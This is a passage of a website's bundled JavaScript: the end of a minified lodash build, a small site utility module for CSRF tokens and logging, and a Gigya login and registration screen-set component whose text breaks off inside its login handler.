              return cc(n) && bl.call(n, "callee") && !Wl.call(n, "callee");
            },
        bh = il.isArray,
        wh = ce ? z(ce) : ze,
        mh = ql || qa,
        xh = ae ? z(ae) : Ee,
        jh = le ? z(le) : Le,
        Ah = se ? z(se) : Be,
        kh = he ? z(he) : Te,
        Oh = pe ? z(pe) : $e,
        Ih = ii(Ne),
        Rh = ii(function (n, t) {
          return n <= t;
        }),
        zh = Nu(function (n, t) {
          if (Mi(t) || Hf(t)) return $u(t, Pc(t), n), X;
          for (var r in t) bl.call(t, r) && Sr(n, r, t[r]);
        }),
        Eh = Nu(function (n, t) {
          $u(t, qc(t), n);
        }),
        Sh = Nu(function (n, t, r, e) {
          $u(t, qc(t), n, e);
        }),
        Wh = Nu(function (n, t, r, e) {
          $u(t, Pc(t), n, e);
        }),
        Lh = gi(Tr),
        Ch = uu(function (n, t) {
          n = ll(n);
          var r = -1,
            e = t.length,
            u = e > 2 ? t[2] : X;
          for (u && Ui(t[0], t[1], u) && (e = 1); ++r < e; )
            for (var i = t[r], o = qc(i), f = -1, c = o.length; ++f < c; ) {
              var a = o[f],
                l = n[a];
              (l === X || (Gf(l, gl[a]) && !bl.call(n, a))) && (n[a] = i[a]);
            }
          return n;
        }),
        Uh = uu(function (t) {
          return t.push(X, si), n(Mh, X, t);
        }),
        Bh = Xu(function (n, t, r) {
          null != t && "function" != typeof t.toString && (t = xl.call(t)),
            (n[t] = r);
        }, Sa(La)),
        Th = Xu(function (n, t, r) {
          null != t && "function" != typeof t.toString && (t = xl.call(t)),
            bl.call(n, t) ? n[t].push(r) : (n[t] = [r]);
        }, mi),
        $h = uu(Ie),
        Dh = Nu(function (n, t, r) {
          Ke(n, t, r);
        }),
        Mh = Nu(function (n, t, r, e) {
          Ke(n, t, r, e);
        }),
        Fh = gi(function (n, t) {
          var r = {};
          if (null == n) return r;
          var e = !1;
          (t = c(t, function (t) {
            return (t = ku(t, n)), e || (e = t.length > 1), t;
          })),
            $u(n, di(n), r),
            e && (r = Fr(r, an | ln | sn, hi));
          for (var u = t.length; u--; ) yu(r, t[u]);
          return r;
        }),
        Nh = gi(function (n, t) {
          return null == n ? {} : Je(n, t);
        }),
        Ph = ci(Pc),
        qh = ci(qc),
        Zh = Vu(function (n, t, r) {
          return (t = t.toLowerCase()), n + (r ? fa(t) : t);
        }),
        Kh = Vu(function (n, t, r) {
          return n + (r ? "-" : "") + t.toLowerCase();
        }),
        Vh = Vu(function (n, t, r) {
          return n + (r ? " " : "") + t.toLowerCase();
        }),
        Gh = Ku("toLowerCase"),
        Hh = Vu(function (n, t, r) {
          return n + (r ? "_" : "") + t.toLowerCase();
        }),
        Jh = Vu(function (n, t, r) {
          return n + (r ? " " : "") + Qh(t);
        }),
        Yh = Vu(function (n, t, r) {
          return n + (r ? " " : "") + t.toUpperCase();
        }),
        Qh = Ku("toUpperCase"),
        Xh = uu(function (t, r) {
          try {
            return n(t, X, r);
          } catch (n) {
            return rc(n) ? n : new fl(n);
          }
        }),
        np = gi(function (n, t) {
          return (
            r(t, function (t) {
              (t = no(t)), Br(n, t, ch(n[t], n));
            }),
            n
          );
        }),
        tp = Yu(),
        rp = Yu(!0),
        ep = uu(function (n, t) {
          return function (r) {
            return Ie(r, n, t);
          };
        }),
        up = uu(function (n, t) {
          return function (r) {
            return Ie(n, r, t);
          };
        }),
        ip = ti(c),
        op = ti(u),
        fp = ti(h),
        cp = ui(),
        ap = ui(!0),
        lp = ni(function (n, t) {
          return n + t;
        }, 0),
        sp = fi("ceil"),
        hp = ni(function (n, t) {
          return n / t;
        }, 1),
        pp = fi("floor"),
        _p = ni(function (n, t) {
          return n * t;
        }, 1),
        vp = fi("round"),
        gp = ni(function (n, t) {
          return n - t;
        }, 0);
      return (
        (Z.after = If),
        (Z.ary = Rf),
        (Z.assign = zh),
        (Z.assignIn = Eh),
        (Z.assignInWith = Sh),
        (Z.assignWith = Wh),
        (Z.at = Lh),
        (Z.before = zf),
        (Z.bind = ch),
        (Z.bindAll = np),
        (Z.bindKey = ah),
        (Z.castArray = Nf),
        (Z.chain = Qo),
        (Z.chunk = uo),
        (Z.compact = io),
        (Z.concat = oo),
        (Z.cond = za),
        (Z.conforms = Ea),
        (Z.constant = Sa),
        (Z.countBy = Xs),
        (Z.create = Sc),
        (Z.curry = Ef),
        (Z.curryRight = Sf),
        (Z.debounce = Wf),
        (Z.defaults = Ch),
        (Z.defaultsDeep = Uh),
        (Z.defer = lh),
        (Z.delay = sh),
        (Z.difference = Us),
        (Z.differenceBy = Bs),
        (Z.differenceWith = Ts),
        (Z.drop = fo),
        (Z.dropRight = co),
        (Z.dropRightWhile = ao),
        (Z.dropWhile = lo),
        (Z.fill = so),
        (Z.filter = lf),
        (Z.flatMap = sf),
        (Z.flatMapDeep = hf),
        (Z.flatMapDepth = pf),
        (Z.flatten = _o),
        (Z.flattenDeep = vo),
        (Z.flattenDepth = go),
        (Z.flip = Lf),
        (Z.flow = tp),
        (Z.flowRight = rp),
        (Z.fromPairs = yo),
        (Z.functions = $c),
        (Z.functionsIn = Dc),
        (Z.groupBy = rh),
        (Z.initial = mo),
        (Z.intersection = $s),
        (Z.intersectionBy = Ds),
        (Z.intersectionWith = Ms),
        (Z.invert = Bh),
        (Z.invertBy = Th),
        (Z.invokeMap = eh),
        (Z.iteratee = Ca),
        (Z.keyBy = uh),
        (Z.keys = Pc),
        (Z.keysIn = qc),
        (Z.map = yf),
        (Z.mapKeys = Zc),
        (Z.mapValues = Kc),
        (Z.matches = Ua),
        (Z.matchesProperty = Ba),
        (Z.memoize = Cf),
        (Z.merge = Dh),
        (Z.mergeWith = Mh),
        (Z.method = ep),
        (Z.methodOf = up),
        (Z.mixin = Ta),
        (Z.negate = Uf),
        (Z.nthArg = Ma),
        (Z.omit = Fh),
        (Z.omitBy = Vc),
        (Z.once = Bf),
        (Z.orderBy = df),
        (Z.over = ip),
        (Z.overArgs = hh),
        (Z.overEvery = op),
        (Z.overSome = fp),
        (Z.partial = ph),
        (Z.partialRight = _h),
        (Z.partition = ih),
        (Z.pick = Nh),
        (Z.pickBy = Gc),
        (Z.property = Fa),
        (Z.propertyOf = Na),
        (Z.pull = Fs),
        (Z.pullAll = Oo),
        (Z.pullAllBy = Io),
        (Z.pullAllWith = Ro),
        (Z.pullAt = Ns),
        (Z.range = cp),
        (Z.rangeRight = ap),
        (Z.rearg = vh),
        (Z.reject = mf),
        (Z.remove = zo),
        (Z.rest = Tf),
        (Z.reverse = Eo),
        (Z.sampleSize = jf),
        (Z.set = Jc),
        (Z.setWith = Yc),
        (Z.shuffle = Af),
        (Z.slice = So),
        (Z.sortBy = oh),
        (Z.sortedUniq = $o),
        (Z.sortedUniqBy = Do),
        (Z.split = da),
        (Z.spread = $f),
        (Z.tail = Mo),
        (Z.take = Fo),
        (Z.takeRight = No),
        (Z.takeRightWhile = Po),
        (Z.takeWhile = qo),
        (Z.tap = Xo),
        (Z.throttle = Df),
        (Z.thru = nf),
        (Z.toArray = jc),
        (Z.toPairs = Ph),
        (Z.toPairsIn = qh),
        (Z.toPath = Ha),
        (Z.toPlainObject = Rc),
        (Z.transform = Qc),
        (Z.unary = Mf),
        (Z.union = Ps),
        (Z.unionBy = qs),
        (Z.unionWith = Zs),
        (Z.uniq = Zo),
        (Z.uniqBy = Ko),
        (Z.uniqWith = Vo),
        (Z.unset = Xc),
        (Z.unzip = Go),
        (Z.unzipWith = Ho),
        (Z.update = na),
        (Z.updateWith = ta),
        (Z.values = ra),
        (Z.valuesIn = ea),
        (Z.without = Ks),
        (Z.words = Ra),
        (Z.wrap = Ff),
        (Z.xor = Vs),
        (Z.xorBy = Gs),
        (Z.xorWith = Hs),
        (Z.zip = Js),
        (Z.zipObject = Jo),
        (Z.zipObjectDeep = Yo),
        (Z.zipWith = Ys),
        (Z.entries = Ph),
        (Z.entriesIn = qh),
        (Z.extend = Eh),
        (Z.extendWith = Sh),
        Ta(Z, Z),
        (Z.add = lp),
        (Z.attempt = Xh),
        (Z.camelCase = Zh),
        (Z.capitalize = fa),
        (Z.ceil = sp),
        (Z.clamp = ua),
        (Z.clone = Pf),
        (Z.cloneDeep = Zf),
        (Z.cloneDeepWith = Kf),
        (Z.cloneWith = qf),
        (Z.conformsTo = Vf),
        (Z.deburr = ca),
        (Z.defaultTo = Wa),
        (Z.divide = hp),
        (Z.endsWith = aa),
        (Z.eq = Gf),
        (Z.escape = la),
        (Z.escapeRegExp = sa),
        (Z.every = af),
        (Z.find = nh),
        (Z.findIndex = ho),
        (Z.findKey = Wc),
        (Z.findLast = th),
        (Z.findLastIndex = po),
        (Z.findLastKey = Lc),
        (Z.floor = pp),
        (Z.forEach = _f),
        (Z.forEachRight = vf),
        (Z.forIn = Cc),
        (Z.forInRight = Uc),
        (Z.forOwn = Bc),
        (Z.forOwnRight = Tc),
        (Z.get = Mc),
        (Z.gt = gh),
        (Z.gte = yh),
        (Z.has = Fc),
        (Z.hasIn = Nc),
        (Z.head = bo),
        (Z.identity = La),
        (Z.includes = gf),
        (Z.indexOf = wo),
        (Z.inRange = ia),
        (Z.invoke = $h),
        (Z.isArguments = dh),
        (Z.isArray = bh),
        (Z.isArrayBuffer = wh),
        (Z.isArrayLike = Hf),
        (Z.isArrayLikeObject = Jf),
        (Z.isBoolean = Yf),
        (Z.isBuffer = mh),
        (Z.isDate = xh),
        (Z.isElement = Qf),
        (Z.isEmpty = Xf),
        (Z.isEqual = nc),
        (Z.isEqualWith = tc),
        (Z.isError = rc),
        (Z.isFinite = ec),
        (Z.isFunction = uc),
        (Z.isInteger = ic),
        (Z.isLength = oc),
        (Z.isMap = jh),
        (Z.isMatch = ac),
        (Z.isMatchWith = lc),
        (Z.isNaN = sc),
        (Z.isNative = hc),
        (Z.isNil = _c),
        (Z.isNull = pc),
        (Z.isNumber = vc),
        (Z.isObject = fc),
        (Z.isObjectLike = cc),
        (Z.isPlainObject = gc),
        (Z.isRegExp = Ah),
        (Z.isSafeInteger = yc),
        (Z.isSet = kh),
        (Z.isString = dc),
        (Z.isSymbol = bc),
        (Z.isTypedArray = Oh),
        (Z.isUndefined = wc),
        (Z.isWeakMap = mc),
        (Z.isWeakSet = xc),
        (Z.join = xo),
        (Z.kebabCase = Kh),
        (Z.last = jo),
        (Z.lastIndexOf = Ao),
        (Z.lowerCase = Vh),
        (Z.lowerFirst = Gh),
        (Z.lt = Ih),
        (Z.lte = Rh),
        (Z.max = Ya),
        (Z.maxBy = Qa),
        (Z.mean = Xa),
        (Z.meanBy = nl),
        (Z.min = tl),
        (Z.minBy = rl),
        (Z.stubArray = Pa),
        (Z.stubFalse = qa),
        (Z.stubObject = Za),
        (Z.stubString = Ka),
        (Z.stubTrue = Va),
        (Z.multiply = _p),
        (Z.nth = ko),
        (Z.noConflict = $a),
        (Z.noop = Da),
        (Z.now = fh),
        (Z.pad = ha),
        (Z.padEnd = pa),
        (Z.padStart = _a),
        (Z.parseInt = va),
        (Z.random = oa),
        (Z.reduce = bf),
        (Z.reduceRight = wf),
        (Z.repeat = ga),
        (Z.replace = ya),
        (Z.result = Hc),
        (Z.round = vp),
        (Z.runInContext = p),
        (Z.sample = xf),
        (Z.size = kf),
        (Z.snakeCase = Hh),
        (Z.some = Of),
        (Z.sortedIndex = Wo),
        (Z.sortedIndexBy = Lo),
        (Z.sortedIndexOf = Co),
        (Z.sortedLastIndex = Uo),
        (Z.sortedLastIndexBy = Bo),
        (Z.sortedLastIndexOf = To),
        (Z.startCase = Jh),
        (Z.startsWith = ba),
        (Z.subtract = gp),
        (Z.sum = el),
        (Z.sumBy = ul),
        (Z.template = wa),
        (Z.times = Ga),
        (Z.toFinite = Ac),
        (Z.toInteger = kc),
        (Z.toLength = Oc),
        (Z.toLower = ma),
        (Z.toNumber = Ic),
        (Z.toSafeInteger = zc),
        (Z.toString = Ec),
        (Z.toUpper = xa),
        (Z.trim = ja),
        (Z.trimEnd = Aa),
        (Z.trimStart = ka),
        (Z.truncate = Oa),
        (Z.unescape = Ia),
        (Z.uniqueId = Ja),
        (Z.upperCase = Yh),
        (Z.upperFirst = Qh),
        (Z.each = _f),
        (Z.eachRight = vf),
        (Z.first = bo),
        Ta(
          Z,
          (function () {
            var n = {};
            return (
              ue(Z, function (t, r) {
                bl.call(Z.prototype, r) || (n[r] = t);
              }),
              n
            );
          })(),
          { chain: !1 }
        ),
        (Z.VERSION = nn),
        r(
          ["bind", "bindKey", "curry", "curryRight", "partial", "partialRight"],
          function (n) {
            Z[n].placeholder = Z;
          }
        ),
        r(["drop", "take"], function (n, t) {
          (Ct.prototype[n] = function (r) {
            r = r === X ? 1 : Gl(kc(r), 0);
            var e = this.__filtered__ && !t ? new Ct(this) : this.clone();
            return (
              e.__filtered__
                ? (e.__takeCount__ = Hl(r, e.__takeCount__))
                : e.__views__.push({
                    size: Hl(r, Un),
                    type: n + (e.__dir__ < 0 ? "Right" : ""),
                  }),
              e
            );
          }),
            (Ct.prototype[n + "Right"] = function (t) {
              return this.reverse()[n](t).reverse();
            });
        }),
        r(["filter", "map", "takeWhile"], function (n, t) {
          var r = t + 1,
            e = r == Rn || r == En;
          Ct.prototype[n] = function (n) {
            var t = this.clone();
            return (
              t.__iteratees__.push({ iteratee: mi(n, 3), type: r }),
              (t.__filtered__ = t.__filtered__ || e),
              t
            );
          };
        }),
        r(["head", "last"], function (n, t) {
          var r = "take" + (t ? "Right" : "");
          Ct.prototype[n] = function () {
            return this[r](1).value()[0];
          };
        }),
        r(["initial", "tail"], function (n, t) {
          var r = "drop" + (t ? "" : "Right");
          Ct.prototype[n] = function () {
            return this.__filtered__ ? new Ct(this) : this[r](1);
          };
        }),
        (Ct.prototype.compact = function () {
          return this.filter(La);
        }),
        (Ct.prototype.find = function (n) {
          return this.filter(n).head();
        }),
        (Ct.prototype.findLast = function (n) {
          return this.reverse().find(n);
        }),
        (Ct.prototype.invokeMap = uu(function (n, t) {
          return "function" == typeof n
            ? new Ct(this)
            : this.map(function (r) {
                return Ie(r, n, t);
              });
        })),
        (Ct.prototype.reject = function (n) {
          return this.filter(Uf(mi(n)));
        }),
        (Ct.prototype.slice = function (n, t) {
          n = kc(n);
          var r = this;
          return r.__filtered__ && (n > 0 || t < 0)
            ? new Ct(r)
            : (n < 0 ? (r = r.takeRight(-n)) : n && (r = r.drop(n)),
              t !== X &&
                ((t = kc(t)), (r = t < 0 ? r.dropRight(-t) : r.take(t - n))),
              r);
        }),
        (Ct.prototype.takeRightWhile = function (n) {
          return this.reverse().takeWhile(n).reverse();
        }),
        (Ct.prototype.toArray = function () {
          return this.take(Un);
        }),
        ue(Ct.prototype, function (n, t) {
          var r = /^(?:filter|find|map|reject)|While$/.test(t),
            e = /^(?:head|last)$/.test(t),
            u = Z[e ? "take" + ("last" == t ? "Right" : "") : t],
            i = e || /^find/.test(t);
          u &&
            (Z.prototype[t] = function () {
              var t = this.__wrapped__,
                o = e ? [1] : arguments,
                f = t instanceof Ct,
                c = o[0],
                l = f || bh(t),
                s = function (n) {
                  var t = u.apply(Z, a([n], o));
                  return e && h ? t[0] : t;
                };
              l && r && "function" == typeof c && 1 != c.length && (f = l = !1);
              var h = this.__chain__,
                p = !!this.__actions__.length,
                _ = i && !h,
                v = f && !p;
              if (!i && l) {
                t = v ? t : new Ct(this);
                var g = n.apply(t, o);
                return (
                  g.__actions__.push({ func: nf, args: [s], thisArg: X }),
                  new Y(g, h)
                );
              }
              return _ && v
                ? n.apply(this, o)
                : ((g = this.thru(s)), _ ? (e ? g.value()[0] : g.value()) : g);
            });
        }),
        r(["pop", "push", "shift", "sort", "splice", "unshift"], function (n) {
          var t = _l[n],
            r = /^(?:push|sort|unshift)$/.test(n) ? "tap" : "thru",
            e = /^(?:pop|shift)$/.test(n);
          Z.prototype[n] = function () {
            var n = arguments;
            if (e && !this.__chain__) {
              var u = this.value();
              return t.apply(bh(u) ? u : [], n);
            }
            return this[r](function (r) {
              return t.apply(bh(r) ? r : [], n);
            });
          };
        }),
        ue(Ct.prototype, function (n, t) {
          var r = Z[t];
          if (r) {
            var e = r.name + "";
            bl.call(fs, e) || (fs[e] = []), fs[e].push({ name: t, func: r });
          }
        }),
        (fs[Qu(X, vn).name] = [{ name: "wrapper", func: X }]),
        (Ct.prototype.clone = $t),
        (Ct.prototype.reverse = Yt),
        (Ct.prototype.value = Qt),
        (Z.prototype.at = Qs),
        (Z.prototype.chain = tf),
        (Z.prototype.commit = rf),
        (Z.prototype.next = ef),
        (Z.prototype.plant = of),
        (Z.prototype.reverse = ff),
        (Z.prototype.toJSON = Z.prototype.valueOf = Z.prototype.value = cf),
        (Z.prototype.first = Z.prototype.head),
        Ul && (Z.prototype[Ul] = uf),
        Z
      );
    },
    be = de();
  "function" == typeof define && "object" == typeof define.amd && define.amd
    ? ((re._ = be),
      define(function () {
        return be;
      }))
    : ue
    ? (((ue.exports = be)._ = be), (ee._ = be))
    : (re._ = be);
}.call(this));
var cf=function(e,n,t){"use strict";var o,i,a={};function r(e){this.component=e,this.error=function(e){a.logLevel>0&&(console.info("Component : "+this.component),console.error(e))},this.warn=function(e){a.logLevel>1&&(console.info("Component : "+this.component),console.warn(e))},this.info=function(e){a.logLevel>2&&(console.info("Component : "+this.component),console.info(e))}}return a.utils={},a.logLevel=Cog.Cookie.read("logLevel"),a.csrfToken="",a.loadCsrfToken=function(e){n.get(window.location.pathname.split(".")[0]+".token.json").done(function(t){var o="";t.token&&(o=t.token),n(e).append('<input id="cq_csrf_token" name=":cq_csrf_token" type="hidden" value="'+o+'"/>')})},a.refreshToken=function(){n.get(window.location.pathname.split(".")[0]+".token.json").done(function(e){n("form").each(function(){!n(this).parent().hasClass("gigya-screen")&&n(this).attr("method")&&"get"!==n(this).attr("method").toLowerCase&&(n(this).find('input[name=":cq_csrf_token"]').length>0?n(this).find('input[name=":cq_csrf_token"]').val(e.token):n(this).append('<input name=":cq_csrf_token" type="hidden" value="'+e.token+'"/>'))}),a.csrfToken=e.token})},a.utils.browser=(i={},(o=function(e){e=e.toLowerCase();var n=/(chrome)[ \/]([\w.]+)/.exec(e)||/(webkit)[ \/]([\w.]+)/.exec(e)||/(opera)(?:.*version|)[ \/]([\w.]+)/.exec(e)||/(msie) ([\w.]+)/.exec(e)||e.indexOf("compatible")<0&&/(mozilla)(?:.*? rv:([\w.]+)|)/.exec(e)||[];return{browser:n[1]||"",version:n[2]||"0"}}(navigator.userAgent)).browser&&(i[o.browser]=!0,i.version=o.version),i.chrome?i.webkit=!0:i.webkit&&(i.safari=!0),i),a.getGigyaValue=function(e,n){var t="",o=n.split("."),i=e;return o.forEach(function(e){"object"==typeof i[e]?i=i[e]:void 0!==i[e]&&""!==i[e]&&(t=i[e])}),t},a.setLogLevel=function(e){a.logLevel=e,Cog.Cookie.create("logLevel",e)},a.getLogger=function(e){return new r(e)},a.refreshToken(),setInterval(function(){a.refreshToken()},3e5),a.getParameterByName=function(e){e=e.replace(/[\[]/,"\\[").replace(/[\]]/,"\\]");var n=new RegExp("[\\?&]"+e+"=([^&#]*)").exec(location.search);return null===n?"":decodeURIComponent(n[1].replace(/\+/g," "))},a.getSiteLocale=function(){var e,n=window.location.pathname;return e=0===n.indexOf("/content")?(e=n.split("/")[4]).replace("_","-"):n.split("/")[1],/^[A-Za-z]{2}-[A-Za-z]{2}$/.test(e)?e.toLowerCase():""},a.getPagePath=function(){return window.location.pathname.split(".")[0]},a}(document,Cog.jQuery(),_);!function(e){"use strict";e(".sso-link .richText-content a").click(function(n){n.preventDefault();e(this);var t=e(this).attr("href");gigya.accounts.getAccountInfo({callback:function(e){t+="?data[UID]="+e.UID+"&data[UIDSignature]="+e.UIDSignature+"&data[signatureTimestamp]="+e.signatureTimestamp+"&sso=true",window.location.href=t}})}),e(".external-link a").click(function(n){n.preventDefault();var t=e(this),o=e(this).attr("href");gigya.accounts.getAccountInfo({callback:function(e){_.forEach(t.data(),function(n,t){-1===o.indexOf("?")?o+="?"+t+"="+cf.getGigyaValue(e,n):o+="&"+t+"="+cf.getGigyaValue(e,n)}),window.location.href=o}})})}(Cog.jQuery());
var gigyaraas = (function ($) {
    'use strict';

    var api = {},
        log = cf.getLogger('gigya-raas'),
        initialConfig = {
            datastorePattern: 'data.ds.',
            veevaBuId: '',
            allowLoginStatus: true,
            consentArray: [],
            lookUpValidationStatus: 'not-started',
            trailcount: 0,
            showpanel: 0,
            isFirst: true,
            registrationStatus: 'not-started',
            loginMethod: 'default',
            consentCount: 0,
            profileAlterCnt: 0,
            CRMIDValue: ''
        };

    var onExecuteLoginCallbacks = [],
        executionStack = [];

    api.actions = [];


    api.onRegister = function (element) {
        if (typeof gigya !== 'undefined') {
            var initialConfigClone = $.extend(true, {}, initialConfig),
                $component = element.$scope,
                componentId = $component.data('componentId'),
                pageReload = $component.data('pageReload'),
                emptyResource = $component.data('emptyResource'),
                gigyaParams = {},
                localConfig = $.extend(true, initialConfigClone, $component.data());

            gigyaParams.screenSet = localConfig.screenSet;
            gigyaParams.mobileScreenSet = localConfig.mobileScreenSet;
            gigyaParams.startScreen = localConfig.startScreen;
            gigyaParams.containerID = localConfig.componentId;
            gigyaParams.customLang = window.gigyaCustomLang[gigyaParams.containerID];
            if (typeof localConfig.lang === 'undefined' || localConfig.lang === 'master') {
                gigyaParams.lang = 'default';
            } else {
                gigyaParams.lang = localConfig.lang;
            }
            if (localConfig.formType === 'login') {
                gigyaParams.customButtons = api.buildCustomButtons(localConfig);
            }
            //event handlers
            gigyaParams.onError = api.onError;
            gigyaParams.onBeforeSubmit = api.onBeforeSubmit;
            gigyaParams.onSubmit = api.onSubmit;
            gigyaParams.onBeforeValidation = api.onBeforeValidation;
            gigyaParams.onAfterSubmit = api.onAfterSubmit;
            gigyaParams.onBeforeScreenLoad = api.onBeforeScreenLoad;
            gigyaParams.onAfterScreenLoad = api.onAfterScreenLoad;
            gigyaParams.onFieldChanged = api.onFieldChanged;
            gigyaParams.onHide = api.onHide;
            gigyaParams.context = localConfig;
            gigyaParams.context.componentId = componentId;
            gigyaParams.context.pageReload = pageReload;
            gigyaParams.context.emptyResource = emptyResource;

            api.initializeGigyaScreens(gigyaParams, $component, localConfig);
        } else if (console && console.warn) {
            console.warn('Gigya is not defined!');
        }
    };

    api.initializeGigyaScreens = function (screensetParams, $component, config) {
        var regToken = cf.getParameterByName("regToken");
        if (regToken) {
            screensetParams.regToken = regToken;
        }
        if (config.screensetMethod === 'staticCacheScreenset') {
            $component.append('<style>' + config.screensetCache.css + '</style>' + '<div style="display:none;">' + config.screensetCache.html + '</div>');
            var translationValue = config.screensetCache.translations[screensetParams.lang];
            if (!translationValue) {
                translationValue = config.screensetCache.translations['default'];
            }
            screensetParams.customLang = $.extend(screensetParams.customLang, translationValue);
        }
        var formLink = $component.find('a.gigya-raas-link');
        if (formLink.length > 0) {
            formLink.click(function (e) {
                e.preventDefault();
                delete screensetParams.containerID;
                screensetParams.context.overlayMode = true;
                gigya.accounts.showScreenSet(screensetParams);
            });
        }
        gigya.accounts.showScreenSet(screensetParams);
    };

    api.getVisibleScreen = function (response) {
        var contextData = response.context,
            $component = $('div[data-component-id="' + response.context.componentId + '"]'),
            $visibleScreen;

        if (contextData.overlayMode) {
            $visibleScreen = $('#gigya-screen-dialog-page-overlay').parent();
        } else {
            $visibleScreen = $component.find('#' + contextData.componentId);
        }

        return $visibleScreen;
    };

    api.getComponent = function (response) {
        return $('div[data-component-id="' + response.context.componentId + '"]');
    };

    api.buildCustomButtons = function (config) {
        var customButtonArray = [],
            idpConfigs = config.idpConfigs;
        if (idpConfigs) {
            $.each(idpConfigs, function (index, element) {
                if (element.idpName) {
                    var customButtonValues = {};
                    customButtonValues.type = element.loginType;
                    customButtonValues.providerName = element.providerName;
                    customButtonValues.idpName = element.idpName;
                    customButtonValues.iconURL = element.iconURL;
                    customButtonValues.logoURL = element.logoURL;
                    customButtonValues.lastLoginIconURL = element.lastLoginIconURL;
                    customButtonValues.position = element.position;
                    customButtonArray.push(customButtonValues);
                }
            });

        }
        return customButtonArray;
    };

    api.onError = function (response) {
        var onErrorActions = api.getActions('onError'),
            config = response.context;
        onErrorActions.forEach(function (action) {
            executionStack.push({response: response, config: config});
            action.callFunction.call(this, response, config);
            executionStack.pop();
        });
    };

    api.onBeforeSubmit = function (response) {
        var ret = true,
            beforeActions = api.getActions('onBeforeSubmit'),
            config = response.context;
        beforeActions.forEach(function (action, index) {
            executionStack.push({response: response, config: config});
            var returnval = action.callFunction.call(this, response, config, null, index);
            executionStack.pop();
            if (typeof returnval === 'undefined') {
                returnval = true;
            }
            ret = returnval && ret;
        });
        return ret;
    };

    api.onSubmit = function (response) {
        var onSubmitActions = api.getActions('onSubmit'),
            config = response.context;
        onSubmitActions.forEach(function (action) {
            executionStack.push({response: response, config: config});
            action.callFunction.call(this, response, config);
            executionStack.pop();
        });
    };

    api.onBeforeValidation = function (response) {
        var onBeforeValidationActions = api.getActions('onBeforeValidation'),
            config = response.context, result = {};
        for (var i = 0; i < onBeforeValidationActions.length; i++) {
            executionStack.push({response: response, config: config});
            var partialResult = onBeforeValidationActions[i].callFunction.call(this, response, config);
            executionStack.pop();
            if (partialResult) {
                Object.assign(result, partialResult);
            }
        }
        return result;
    };

    api.onAfterSubmit = function (response) {
        //optional functions
        var optionalAfterActions = api.getActions('optionalOnAfterSubmit'),
            afterActions = api.getActions('onAfterSubmit'),
            returns = [],
            config = response.context,
            onAllAfterActionsCalledDfrd = $.Deferred();

        optionalAfterActions.forEach(function (action) {
            executionStack.push({response: response, config: config});
            action.callFunction.call(this, response, config);
            executionStack.pop();
        });


        afterActions.forEach(function (action) {
            returns.push($.Deferred(function (dfrd) {
                executionStack.push({response: response, config: config});
                action.callFunction.call(this, response, config, dfrd, onAllAfterActionsCalledDfrd);
                executionStack.pop();
            }));
        });
        $.when.apply(window, returns)
            .then(onAllAfterActionsCalledDfrd.resolve)
            .then(function () {
                if (config.formType === 'registration') {
                    if ((response.response.isRegistered && !config.emailVerification) || (response.response.isRegistered && response.response.isVerified && config.emailVerification)) {
                        response.response.context.registrationStatus = 'complete';
                        api.loginEventHandler(response);
                    }
                } else {
                    api.redirect(response);
                }
            });

    };

    api.redirect = function (response) {
        if (response.context.resource && response.response.status === 'OK' && !(response.context.formType === 'registration' && response.context.autoLogin !== true) && response.context.formType !== 'login' && response.context.formType !== 'event-registration' && !response.context.emptyResource) {
            window.location.pathname = response.context.resource;
        }
    };

    api.onBeforeScreenLoad = function (response) {
        var onBeforeScreenLoadActions = api.getActions('onBeforeScreenLoad'),
            config = response.context;
        onBeforeScreenLoadActions.forEach(function (action) {
            executionStack.push({response: response, config: config});
            action.callFunction.call(this, response, config);
            executionStack.pop();
        });
    };

    api.onAfterScreenLoad = function (response) {
        var onAfterScreenLoadActions = api.getActions('onAfterScreenLoad'),
            config = response.context;
        if (response.context.formType === 'registration') {
            response.context.loginMethod = 'registration';
        }

        onAfterScreenLoadActions.forEach(function (action) {
            executionStack.push({response: response, config: config});
            action.callFunction.call(this, response, config);
            executionStack.pop();
        });
        response.context.isFirst = false;
        if (response.context.registrationPage) {
            var registrationLinkId = 'a[href$=\"' + response.context.registrationPage + '.html\"]',
                mappedRegistrationLinkId = 'a[href$=\"' + response.context.registrationPageMapping + '.html\"]';
            $(registrationLinkId).add(mappedRegistrationLinkId).click(function (e) {
                e.originalEvent.currentTarget.href += "?resource=" + encodeURIComponent(response.context.resource);
            });
        }
    };

    api.onFieldChanged = function (response) {
        var onFieldChangedActions = api.getActions('onFieldChanged'),
            config = response.context;
        onFieldChangedActions.forEach(function (action) {
            executionStack.push({response: response, config: config});
            action.callFunction.call(this, response, config);
            executionStack.pop();
        });
    };

    api.onHide = function (response) {
        var onHideActions = api.getActions('onHide'),
            config = response.context;

        onHideActions.forEach(function (action) {
            executionStack.push({response: response, config: config});
            action.callFunction.call(this, response, config);
            executionStack.pop();
        });

    };

    api.onLogin = function (response) {
        var onLoginActions = api.getActions('onLogin'),
            config = response.context;
        onLoginActions.forEach(function (action) {
            executionStack.push({response: response, config: config});
            action.callFunction.call(this, response, config);
            executionStack.pop();
        });
    };

    api.onLogout = function (response) {
        var onLogoutActions = api.getActions('onLogout'),
            config = response.context;
        onLogoutActions.forEach(function (action) {
            executionStack.push({response: response, config: config});
            action.callFunction.call(this, response, config);
            executionStack.pop();
        });
    };

    api.getActions = function (type) {
        return _.filter(api.actions, function (o) {
            return o.type === type;
        });
    };

    api.registerAction = function (type, name, func) {
        var gigyaAction = {};
        gigyaAction.callFunction = func;
        gigyaAction.type = type;
        gigyaAction.name = name;
        api.actions.push(gigyaAction);
    };

    api.logoutEventHandler = function (response) {
        api.onLogout(response);
    };

    api.onExecuteLogin = function (callback) {
        if (_.isFunction(callback)) {
            onExecuteLoginCallbacks.push(callback);
        }
    };

    api.executeLogin = function (response) {
        api.onLogin(response);
        if (!response.context.resource) {
            response.context.resource = $('.userBox input[name="resource"]').val() || window.location.pathname;
        }

        var modifiedResponse = {};
        modifiedResponse.UID = response.UID;
        modifiedResponse.UIDSignature = response.UIDSignature;
        modifiedResponse.signatureTimestamp = response.signatureTimestamp;
        modifiedResponse.remember = response.remember;

        var securityPath = window.location.pathname.split(".")[0];
        securityPath = securityPath.slice(-1) !== "/" ? securityPath += "/" : securityPath;

        var queryString = window.location.search.slice(1);
        var queryArray = queryString.split("&");
        var updatedQueryString = "";
        for (var i = 0; i < queryArray.length; i++) {
            var element = queryArray[i];
            if (element.indexOf("resource=") === -1) {
                updatedQueryString += "&" + element;
            }
        }
        if (updatedQueryString) {
            updatedQueryString = updatedQueryString.slice(1);
            if (response.context.resource.indexOf('?') === -1) {
                if (updatedQueryString.charAt(0) !== "?") {
